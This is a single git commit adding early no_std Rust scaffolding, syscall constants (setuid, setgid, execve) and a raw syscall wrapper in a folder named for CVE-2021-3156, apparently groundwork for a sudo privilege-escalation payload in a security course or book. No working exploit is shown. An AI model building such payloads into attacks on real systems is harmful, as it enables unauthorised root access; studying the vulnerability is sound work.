a7373b8e16c8bfed84a3e6693f6163632420f918
FAMASoon <famasoon@gmail.com>
2022-11-04 19:57:16 +0900

    Write syscall

--- ch7/cve_2021_3156/src/lib.rs
+++ ch7/cve_2021_3156/src/lib.rs
@@ -1,3 +1,29 @@
-fn main() {
-    println!("Hello, world!");
+#![no_std]
+
+use core::arch::asm;
+
+#[panic_handler]
+fn panic(_: &core::panic::PanicInfo) -> ! {
+    loop {}
+}
+
+const STDOUT: u64 = 1;
+const SYS_WRITE: u64 = 1;
+const SYS_EXIT: u64 = 60;
+const SYS_SETUID: u64 = 105;
+const SYS_SETGID: u64 = 106;
+const SYS_GETUID: u64 = 102;
+const SYS_EXECVE: u64 = 59;
+
+unsafe fn syscall0(scnum: u64) -> u64 {
+    let ret: u64;
+    asm!(
+        "syscall",
+        in("rax") scnum,
+        out("rcx") _,
+        out("r11") _,
+        lateout("rax") ret,
+        options(nostack),
+    );
+    ret
 }
